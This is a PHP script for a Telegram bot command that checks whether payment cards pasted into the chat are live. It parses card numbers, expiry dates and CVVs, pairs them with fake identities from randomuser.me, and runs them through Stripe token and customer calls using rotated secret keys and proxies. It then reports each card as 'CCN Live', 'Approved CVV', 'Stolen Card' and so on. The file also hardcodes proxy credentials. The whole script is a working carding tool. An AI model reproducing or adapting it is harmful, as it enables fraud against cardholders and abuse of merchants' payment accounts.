<?php
//Script Author: ᴛɪᴋᴏʟ4ʟɪғᴇ https://t.me/Tikol4Life

/*===[PHP Setup]==============================================*/
error_reporting(0);
ini_set('display_errors', 0);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

/*===[Include Setup]==========================================*/
// include 'preset.php';

/*===[cURL Processes]=========================================*/
if(strpos($message, "/py ") === 0 || strpos($message, "!py ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>⌛ESPERA lA MAGIA...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id
        ]);
        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
            
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $sk = $config['sk_keys'];
            shuffle($sk);
            $sec = $sk[0];

            file_put_contents('sk.txt',$sk);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
                $schemename = "Unavailable";
            }
            if (empty($typename)) {
                $typename = "Unavailable";
            }
            if (empty($brand)) {
                $brand = "Unavailable";
            }
            if (empty($bank)) {
                $bank = "Unavailable";
            }
            if (empty($cname)) {
                $cname = "Unavailable";
            }
            if (empty($phone)) {
                $phone = "Unavailable";
            }

            function anicap($string, $start, $end)
            {
                $str = explode($start, $string);
                $str = explode($end, $str[1]);
                $str = trim(strip_tags($str[0]));
                return $str;
            }
            function GetStr($string, $start, $end) {
                $str = explode($start, $string);
                $str = explode($end, $str[1]);  
                return $str[0];
            }
            function inStr($string, $start, $end, $value) {
                $str = explode($start, $string);
                $str = explode($end, $str[$value]);
                return $str[0];
            }
            function rebootproxys()
            {
                $poxySocks = file("proxy.txt");
                $myproxy = rand(0, sizeof($poxySocks) - 1);
                $poxySocks = $poxySocks[$myproxy];
                return $poxySocks;
            }
            $poxySocks4 = rebootproxys();

            function value($str,$find_start,$find_end)
            {
                $start = @strpos($str,$find_start);
                if ($start === false) 
                {
                    return "";
                }
                $length = strlen($find_start);
                $end    = strpos(substr($str,$start +$length),$find_end);
                return trim(substr($str,$start +$length,$end));
            }

            function mod($dividendo,$divisor)
            {
                return round($dividendo - (floor($dividendo/$divisor)*$divisor));
            }
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIE, 1); 
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            $resposta = curl_exec($ch);
            $firstname = value($resposta, '"first":"', '"');
            $lastname = value($resposta, '"last":"', '"');
            $phone = value($resposta, '"phone":"', '"');
            $zip = value($resposta, '"postcode":', ',');
            $postcode = value($resposta, '"postcode":', ',');
            $state = value($resposta, '"state":"', '"');
            $email = value($resposta, '"email":"', '"');
            $city = value($resposta, '"city":"', '"');
            $street = value($resposta, '"street":"', '"');
            $numero1 = substr($phone, 1,3);
            $numero2 = substr($phone, 6,3);
            $numero3 = substr($phone, 10,4);
            $phone = $numero1.''.$numero2.''.$numero3;
            $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
            $serv_rnd = $serve_arr[array_rand($serve_arr)];
            $email= str_replace("example.com", $serv_rnd, $email);
            if($state=="Alabama"){ $state="AL";
            }else if($state=="alaska"){ $state="AK";
            }else if($state=="arizona"){ $state="AR";
            }else if($state=="california"){ $state="CA";
            }else if($state=="olorado"){ $state="CO";
            }else if($state=="connecticut"){ $state="CT";
            }else if($state=="delaware"){ $state="DE";
            }else if($state=="district of columbia"){ $state="DC";
            }else if($state=="florida"){ $state="FL";
            }else if($state=="georgia"){ $state="GA";
            }else if($state=="hawaii"){ $state="HI";
            }else if($state=="idaho"){ $state="ID";
            }else if($state=="illinois"){ $state="IL";
            }else if($state=="indiana"){ $state="IN";
            }else if($state=="iowa"){ $state="IA";
            }else if($state=="kansas"){ $state="KS";
            }else if($state=="kentucky"){ $state="KY";
            }else if($state=="louisiana"){ $state="LA";
            }else if($state=="maine"){ $state="ME";
            }else if($state=="maryland"){ $state="MD";
            }else if($state=="massachusetts"){ $state="MA";
            }else if($state=="michigan"){ $state="MI";
            }else if($state=="minnesota"){ $state="MN";
            }else if($state=="mississippi"){ $state="MS";
            }else if($state=="missouri"){ $state="MO";
            }else if($state=="montana"){ $state="MT";
            }else if($state=="nebraska"){ $state="NE";
            }else if($state=="nevada"){ $state="NV";
            }else if($state=="new hampshire"){ $state="NH";
            }else if($state=="new jersey"){ $state="NJ";
            }else if($state=="new mexico"){ $state="NM";
            }else if($state=="new york"){ $state="LA";
            }else if($state=="north carolina"){ $state="NC";
            }else if($state=="north dakota"){ $state="ND";
            }else if($state=="Ohio"){ $state="OH";
            }else if($state=="oklahoma"){ $state="OK";
            }else if($state=="oregon"){ $state="OR";
            }else if($state=="pennsylvania"){ $state="PA";
            }else if($state=="rhode Island"){ $state="RI";
            }else if($state=="south carolina"){ $state="SC";
            }else if($state=="south dakota"){ $state="SD";
            }else if($state=="tennessee"){ $state="TN";
            }else if($state=="texas"){ $state="TX";
            }else if($state=="utah"){ $state="UT";
            }else if($state=="vermont"){ $state="VT";
            }else if($state=="virginia"){ $state="VA";
            }else if($state=="washington"){ $state="WA";
            }else if($state=="west virginia"){ $state="WV";
            }else if($state=="wisconsin"){ $state="WI";
            }else if($state=="wyoming"){ $state="WY";
            }else{$state="KY";}

            //==================[BIN LOOK-UP]======================//
            $ch = curl_init();
            $bin = substr($cc, 0,6);
            curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $bindata = curl_exec($ch);
            $binna = json_decode($bindata,true);
            $brand = $binna['scheme'];
            $country = $binna['country']['name'];
            $type = $binna['type'];
            $bank = $binna['bank']['name'];
            curl_close($ch);
            //==================[BIN LOOK-UP-END]======================//
            
            
            if($mes == "01"){
                $sub_mes = "1";
            }elseif($mes == "02"){
                $sub_mes = "2";
            }elseif($mes == "03"){
                $sub_mes = "3";
            }elseif($mes == "04"){
                $sub_mes = "4";
            }elseif($mes == "05"){
                $sub_mes = "5";
            }elseif($mes == "06"){
                $sub_mes = "6";
            }elseif($mes == "07"){
                $sub_mes = "7";
            }elseif($mes == "08"){
                $sub_mes = "8";
            }elseif($mes == "09"){
                $sub_mes = "9";
            }elseif($mes == "10"){
                $sub_mes = "10";
            }elseif($mes == "11"){
                $sub_mes = "11";
            }elseif($mes == "12"){
                $sub_mes = "12";
            }

            if($ano == "22"){
                $sub_ano = "2022";
            }elseif($ano == "23"){
                $sub_ano = "2023";
            }elseif($ano == "24"){
                $sub_ano = "2024";
            }elseif($ano == "25"){
                $sub_ano = "2025";
            }elseif($ano == "26"){
                $sub_ano = "2026";
            }elseif($ano == "27"){
                $sub_ano = "2027";
            }elseif($ano == "28"){
                $sub_ano = "2028";
            }elseif($ano == "29"){
                $sub_ano = "2029";
            }elseif($ano == "30"){
                $sub_ano = "2030";
            }elseif($ano == "31"){
                $sub_ano = "2031";
            }elseif($ano == "32"){
                $sub_ano = "2032";
            }elseif($ano == "33"){
                $sub_ano = "2033";
            }elseif($ano == "34"){
                $sub_ano = "2034";
            }elseif($ano == "2022"){
                $sub_ano = "2022";
            }elseif($ano == "2023"){
                $sub_ano = "2023";
            }elseif($ano == "2024"){
                $sub_ano = "2024";
            }elseif($ano == "2025"){
                $sub_ano = "2025";
            }elseif($ano == "2026"){
                $sub_ano = "2026";
            }elseif($ano == "2027"){
                $sub_ano = "2027";
            }elseif($ano == "2028"){
                $sub_ano = "2028";
            }elseif($ano == "2029"){
                $sub_ano = "2029";
            }elseif($ano == "2030"){
                $sub_ano = "2030";
            }elseif($ano == "2031"){
                $sub_ano = "2031";
            }elseif($ano == "2032"){
                $sub_ano = "2032";
            }elseif($ano == "2033"){
                $sub_ano = "2033";
            }elseif($ano == "2034"){
                $sub_ano = "2034";
            }
            //=======================[Proxys]=============================//

            $username = 'LYHBl6a1ssT'; 
            $password = 'zc7l6f4Tn'; 
            
            $proxiss = explode(":", $poxySocks4);

            //=======================[Proxys END]=============================//
            $num = rand(1000, 9999);
            $XeroSploitJef = uniqid();

            //=======================API===================================//
            /* 1st cURL */
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$sub_ano.'&card[cvc]='.$cvv);
            curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
            $headers = array();
            $headers[] = 'Content-Type: application/x-www-form-urlencoded';
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            $curl = curl_exec($ch);
            curl_close($ch);

            /* 1st cURL Response */
            $res1 = json_decode($curl, true);
            $card = $res1['card']['id'];

            if(isset($res1['id'])){
                /* 2nd cURL */
                $ch1 = curl_init();
                curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch1, CURLOPT_POST, 1);
                curl_setopt($ch1, CURLOPT_POSTFIELDS, 'email='.$email.'&description=Tikol4Life&source='.$res1["id"].'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
                curl_setopt($ch1, CURLOPT_USERPWD, $sk . ':' . '');
                $headers = array();
                $headers[] = 'Content-Type: application/x-www-form-urlencoded';
                curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
                $curl2 = curl_exec($ch1);
                curl_close($ch1);
            
                /* 2nd cURL Response */
                $res2 = json_decode($curl2, true);
                $cus = $res2['id'];
                
            }
            
            if (isset($res2['id'])&&!isset($res2['sources'])) {
                /* 3rd cURL */
                $ch3 = curl_init();
                curl_setopt($ch3, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$cus.'/sources/'.$card);
                curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
                curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
                $headers = array();
                $headers[] = 'Content-Type: application/x-www-form-urlencoded';
                curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
                $curl3 = curl_exec($ch3);
                curl_close($ch3);
            
                /* 3rd cURL Response */
                $res3 = json_decode($curl3, true);
            
            }
            //===================RESPONSE=======================//
            if(isset($res1['error'])){
                //DEAD
                $code = $res1['error']['code'];
                $decline_code = $res1['error']['decline_code'];
                $message = $res1['error']['message'];
            
                if(isset($res1['error']['decline_code'])){
                    $codex = $decline_code;
                }else{
                    $codex = $code;
                }
                $err = ''.$res1['error']['message'].' '.$codex;
                
                if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
                    //CCN LIVE
                    addTotal();
                    addUserTotal($userId);
        
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
        <b>Status -» Stripe CCN Live ✅#CCN
        Response -» <code>$code</code>
        Gateway -» Stripe Auth 1
        Time -» <b>$time</b><b>s</b>
        
        ------- Bin Info -------</b>
        <b>Bank -»</b> $bank
        <b>Brand -»</b> $schemename
        <b>Type -»</b> $typename
        <b>Currency -»</b> $currency
        <b>Country -»</b> $cname ($emoji - 💲$currency)
        <b>Issuers Contact -»</b> $phone
        <b>----------------------------</b>
        
        <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
        <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                        
                    ]);
                }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
                    //CVV LIVE: Insufficient Funds
                    addTotal();
                    addUserTotal($userId);
                    addCCN();
                    addUserCCN($userId);
                    addCVV();
                    addUserCVV($userId);
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
        <b>Status -» Approved CVV Insufficient Funds ✅
        Response -» $code
        Gateway -» Stripe Gateway
        Time -» <b>$time</b><b>s</b>
        
        ------- Bin Info -------</b>
        <b>Bank -»</b> $bank
        <b>Brand -»</b> $schemename
        <b>Type -»</b> $typename
        <b>Currency -»</b> $currency
        <b>Country -»</b> $cname ($emoji - 💲$currency)
        <b>Issuers Contact -»</b> $phone
        <b>----------------------------</b>
        
        <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
        <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                        
                    ]);
                }elseif($code == "lost_card"||$decline_code == "lost_card"){
                    //CCN LIVE: Lost Card
                    addTotal();
                    addUserTotal($userId);
        
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
        <b>Status -» Stripe CCN Lost Card ✅#CCN
        Response -» <code>$code</code>
        Gateway -» Stripe Auth 1
        Time -» <b>$time</b><b>s</b>
        
        ------- Bin Info -------</b>
        <b>Bank -»</b> $bank
        <b>Brand -»</b> $schemename
        <b>Type -»</b> $typename
        <b>Currency -»</b> $currency
        <b>Country -»</b> $cname ($emoji - 💲$currency)
        <b>Issuers Contact -»</b> $phone
        <b>----------------------------</b>
        
        <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
        <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                        
                    ]);
                }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
                    //CCN LIVE: Stolen Card
                    addTotal();
                    addUserTotal($userId);
        
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
        <b>Status -» Stripe CCN Stolen Card ✅#CCN
        Response -» <code>$code</code>
        Gateway -» Stripe Auth 1
        Time -» <b>$time</b><b>s</b>
        
        ------- Bin Info -------</b>
        <b>Bank -»</b> $bank
        <b>Brand -»</b> $schemename
        <b>Type -»</b> $typename
        <b>Currency -»</b> $currency
        <b>Country -»</b> $cname ($emoji - 💲$currency)
        <b>Issuers Contact -»</b> $phone
        <b>----------------------------</b>
        
        <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
        <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                        
                    ]);
                }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
                    //TESTMODE CHARGES
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>REINTENTAR ➜ SK Error: TestMode Charges</b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                    ]);
                }elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
                    //INTEGRATION ERROR
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>REINTENTAR ➜ SK Error: Integration</b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                    ]);
                }elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
                    //VERIFY NUMBER
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>REINTENTAR ➜ SK Error: Verify Phone Number</b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                    ]);
                }else{
                    //DEAD
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>REINTENTAR ➜ DEAD '.$code.'</b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                    ]);
                }
            }else{
                if (isset($res2['error'])) {
                    //DEAD
                    $code = $res2['error']['code'];
                    $decline_code = $res2['error']['decline_code'];
                    $message = $res2['error']['message'];
                    if(isset($res2['error']['decline_code'])){
                        $codex = $decline_code;
                    }else{
                        $codex = $code;
                    }
                    $err = ''.$res2['error']['message'].' '.$codex;
            
                    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
                        //CCN LIVE
                        addTotal();
                        addUserTotal($userId);
            
                        bot('editMessageText',[
                            'chat_id'=>$chat_id,
                            'message_id'=>$messageidtoedit,
                            'text'=>"<b>Card:</b> <code>$lista</code>
            <b>Status -» CCN Match [Incorrect CVV]✅#CCN
            Response -» <code>$code</code>
            Gateway -» Stripe Auth 1
            Time -» <b>$time</b><b>s</b>
            
            ------- Bin Info -------</b>
            <b>Bank -»</b> $bank
            <b>Brand -»</b> $schemename
            <b>Type -»</b> $typename
            <b>Currency -»</b> $currency
            <b>Country -»</b> $cname ($emoji - 💲$currency)
            <b>Issuers Contact -»</b> $phone
            <b>----------------------------</b>
            
            <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
            <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                            'parse_mode'=>'html',
                            'disable_web_page_preview'=>'true'
                            
                        ]);
                    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
                        //CVV LIVE: Insufficient Funds
                        addTotal();
                        addUserTotal($userId);
                        addCCN();
                        addUserCCN($userId);
                        addCVV();
                        addUserCVV($userId);
                        bot('editMessageText',[
                            'chat_id'=>$chat_id,
                            'message_id'=>$messageidtoedit,
                            'text'=>"<b>Card:</b> <code>$lista</code>
            <b>Status -» Approved CVV Insufficient Funds ✅
            Response -» $code
            Gateway -» Stripe Gateway
            Time -» <b>$time</b><b>s</b>
            
            ------- Bin Info -------</b>
            <b>Bank -»</b> $bank
            <b>Brand -»</b> $schemename
            <b>Type -»</b> $typename
            <b>Currency -»</b> $currency
            <b>Country -»</b> $cname ($emoji - 💲$currency)
            <b>Issuers Contact -»</b> $phone
            <b>----------------------------</b>
            
            <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
            <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                            'parse_mode'=>'html',
                            'disable_web_page_preview'=>'true'
                            
                        ]);
                    }elseif($code == "lost_card"||$decline_code == "lost_card"){
                        //CCN LIVE: Lost Card
                        addTotal();
                        addUserTotal($userId);
            
                        bot('editMessageText',[
                            'chat_id'=>$chat_id,
                            'message_id'=>$messageidtoedit,
                            'text'=>"<b>Card:</b> <code>$lista</code>
            <b>Status -» Stripe CCN Lost Card ✅#CCN
            Response -» <code>$code</code>
            Gateway -» Stripe Auth 1
            Time -» <b>$time</b><b>s</b>
            
            ------- Bin Info -------</b>
            <b>Bank -»</b> $bank
            <b>Brand -»</b> $schemename
            <b>Type -»</b> $typename
            <b>Currency -»</b> $currency
            <b>Country -»</b> $cname ($emoji - 💲$currency)
            <b>Issuers Contact -»</b> $phone
            <b>----------------------------</b>
            
            <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
            <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                            'parse_mode'=>'html',
                            'disable_web_page_preview'=>'true'
                            
                        ]);
                    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
                        //CCN LIVE: Stolen Card
                        addTotal();
                        addUserTotal($userId);
            
                        bot('editMessageText',[
                            'chat_id'=>$chat_id,
                            'message_id'=>$messageidtoedit,
                            'text'=>"<b>Card:</b> <code>$lista</code>
            <b>Status -» Stripe CCN Stolen Card ✅#CCN
            Response -» <code>$code</code>
            Gateway -» Stripe Auth 1
            Time -» <b>$time</b><b>s</b>
            
            ------- Bin Info -------</b>
            <b>Bank -»</b> $bank
            <b>Brand -»</b> $schemename
            <b>Type -»</b> $typename
            <b>Currency -»</b> $currency
            <b>Country -»</b> $cname ($emoji - 💲$currency)
            <b>Issuers Contact -»</b> $phone
            <b>----------------------------</b>
            
            <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
            <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                            'parse_mode'=>'html',
                            'disable_web_page_preview'=>'true'
                            
                        ]);
                    }else{
                        //DEAD
                        bot('editMessageText',[
                            'chat_id'=>$chat_id,
                            'message_id'=>$messageidtoedit,
                            'text'=>"<b>REINTENTAR ➜ DEAD '.$code.'</b>",
                            'parse_mode'=>'html',
                            'disable_web_page_preview'=>'true'
                        ]);
                    }
                }else{
                    if (isset($res2['sources'])) {
                        $cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
                        if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                            //CVV MATCH CONGRATS
                            addTotal();
                            addUserTotal($userId);
                            addCCN();
                            addUserCCN($userId);
                            addCVV();
                            addUserCVV($userId);
                            bot('editMessageText',[
                                'chat_id'=>$chat_id,
                                'message_id'=>$messageidtoedit,
                                'text'=>"<b>Card:</b> <code>$lista</code>
                <b>Status -» Approved CVV ✅
                Response -» $code
                Gateway -» Stripe Gateway
                Time -» <b>$time</b><b>s</b>
                
                ------- Bin Info -------</b>
                <b>Bank -»</b> $bank
                <b>Brand -»</b> $schemename
                <b>Type -»</b> $typename
                <b>Currency -»</b> $currency
                <b>Country -»</b> $cname ($emoji - 💲$currency)
                <b>Issuers Contact -»</b> $phone
                <b>----------------------------</b>
                
                <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
                <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                                'parse_mode'=>'html',
                                'disable_web_page_preview'=>'true'
                                
                            ]);
                        }else{
                            //DEAD
                            bot('editMessageText',[
                                'chat_id'=>$chat_id,
                                'message_id'=>$messageidtoedit,
                                'text'=>"<b> ➜ DEAD CVC CHECK'.$code.'</b>",
                                'parse_mode'=>'html',
                                'disable_web_page_preview'=>'true'
                            ]);
                        }
                    }else{
                        $cvc_res3 = $res3['cvc_check'];
                        if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                            //CVV MATCH CONGRATS
                            addTotal();
                            addUserTotal($userId);
                            addCCN();
                            addUserCCN($userId);
                            addCVV();
                            addUserCVV($userId);
                            bot('editMessageText',[
                                'chat_id'=>$chat_id,
                                'message_id'=>$messageidtoedit,
                                'text'=>"<b>Card:</b> <code>$lista</code>
                <b>Status -» Approved CVV ✅
                Response -» $code
                Gateway -» Stripe Gateway
                Time -» <b>$time</b><b>s</b>
                
                ------- Bin Info -------</b>
                <b>Bank -»</b> $bank
                <b>Brand -»</b> $schemename
                <b>Type -»</b> $typename
                <b>Currency -»</b> $currency
                <b>Country -»</b> $cname ($emoji - 💲$currency)
                <b>Issuers Contact -»</b> $phone
                <b>----------------------------</b>
                
                <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
                <b>Bot By: <a href='t.me/RedHoodPRO'>𝓡𝓮𝓭𝓗𝓸𝓸𝓭𝓟𝓡𝓞</a></b>",
                                'parse_mode'=>'html',
                                'disable_web_page_preview'=>'true'
                                
                            ]);
                        }else{
                            //DEAD
                            bot('editMessageText',[
                                'chat_id'=>$chat_id,
                                'message_id'=>$messageidtoedit,
                                'text'=>"<b> ➜ DEAD CVC CHECK'.$code.'</b>",
                                'parse_mode'=>'html',
                                'disable_web_page_preview'=>'true'
                            ]);
                        }
                    }
                }
            }
            //==================================================//

        }else{
            bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Proxy Muerto o Checker!😦</b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
        }
    }
}

// if ($testMode) {
//     echo '<pre>';
//     echo "1st cURL <br>";
//     echo json_encode($res1, JSON_PRETTY_PRINT);
//     if (isset($res1['id'])) {
//         echo "<br><br>2nd cURL <br>";
//         echo json_encode($res2, JSON_PRETTY_PRINT);
//     }
//     if (isset($res2['id'])&&!isset($res2['sources'])) {
//         echo "<br><br>3rd cURL <br>";
//         echo json_encode($res3, JSON_PRETTY_PRINT);
//     }
// }

?>